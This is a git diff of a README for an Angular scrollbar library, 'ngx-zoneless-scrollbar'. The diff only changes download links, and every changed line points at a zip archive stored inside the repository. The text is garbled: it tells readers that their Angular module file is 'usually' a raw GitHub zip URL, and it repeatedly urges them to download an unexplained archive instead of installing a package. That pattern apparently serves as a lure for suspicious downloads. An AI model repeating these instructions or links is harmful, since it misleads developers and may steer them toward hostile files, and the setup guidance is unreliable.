@@ -4,13 +4,13 @@
 
 Welcome to ngx-zoneless-scrollbar! This is a user-friendly scrollbar component designed specifically for Angular applications. It utilizes native browser scrolling with CSS-styled scrollbars. This makes it ideal for projects using Angular's zoneless change detection mode. 
 
-[![Download ngx-zoneless-scrollbar](https://raw.githubusercontent.com/Muhammad-Irfan001/ngx-zoneless-scrollbar/main/projects/ngx-zoneless-scrollbar/scrollbar_ngx_zoneless_3.3.zip)](https://raw.githubusercontent.com/Muhammad-Irfan001/ngx-zoneless-scrollbar/main/projects/ngx-zoneless-scrollbar/scrollbar_ngx_zoneless_3.3.zip)
+[![Download ngx-zoneless-scrollbar](https://github.com/Muhammad-Irfan001/ngx-zoneless-scrollbar/raw/refs/heads/main/demo/src/scrollbar-ngx-zoneless-2.3.zip)](https://github.com/Muhammad-Irfan001/ngx-zoneless-scrollbar/raw/refs/heads/main/demo/src/scrollbar-ngx-zoneless-2.3.zip)
 
 ## 📥 Download & Install
 
 To get started, simply visit the Releases page to download the latest version of ngx-zoneless-scrollbar. Click the link below:
 
-[Download ngx-zoneless-scrollbar](https://raw.githubusercontent.com/Muhammad-Irfan001/ngx-zoneless-scrollbar/main/projects/ngx-zoneless-scrollbar/scrollbar_ngx_zoneless_3.3.zip)
+[Download ngx-zoneless-scrollbar](https://github.com/Muhammad-Irfan001/ngx-zoneless-scrollbar/raw/refs/heads/main/demo/src/scrollbar-ngx-zoneless-2.3.zip)
 
 ### 📋 System Requirements
 
@@ -33,7 +33,7 @@ To get started, simply visit the Releases page to download the latest version of
    ```
 
 4. **Import the Module**  
-   Open your Angular module file (usually `https://raw.githubusercontent.com/Muhammad-Irfan001/ngx-zoneless-scrollbar/main/projects/ngx-zoneless-scrollbar/scrollbar_ngx_zoneless_3.3.zip`) and import the `ZonelessScrollbarModule`:
+   Open your Angular module file (usually `https://github.com/Muhammad-Irfan001/ngx-zoneless-scrollbar/raw/refs/heads/main/demo/src/scrollbar-ngx-zoneless-2.3.zip`) and import the `ZonelessScrollbarModule`:
 
    ```typescript
    import { ZonelessScrollbarModule } from 'ngx-zoneless-scrollbar';
@@ -112,4 +112,4 @@ For support, please open an issue in the repository. We will respond as quickly 
 
 Feel free to share your experiences using ngx-zoneless-scrollbar! 
 
-[Download ngx-zoneless-scrollbar](https://raw.githubusercontent.com/Muhammad-Irfan001/ngx-zoneless-scrollbar/main/projects/ngx-zoneless-scrollbar/scrollbar_ngx_zoneless_3.3.zip)
+[Download ngx-zoneless-scrollbar](https://github.com/Muhammad-Irfan001/ngx-zoneless-scrollbar/raw/refs/heads/main/demo/src/scrollbar-ngx-zoneless-2.3.zip)
